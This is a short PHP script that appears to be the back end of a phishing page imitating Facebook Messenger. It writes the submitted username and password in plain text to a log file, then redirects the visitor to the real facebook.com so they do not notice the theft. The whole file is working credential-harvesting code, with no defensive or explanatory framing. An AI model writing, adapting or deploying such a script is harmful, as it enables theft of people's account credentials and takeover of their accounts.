<?php
$file = 'log.txt';
$fp = fopen($file , 'a');
file_put_contents("log.txt", "Messenger Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.facebook.com/');
exit();
?>
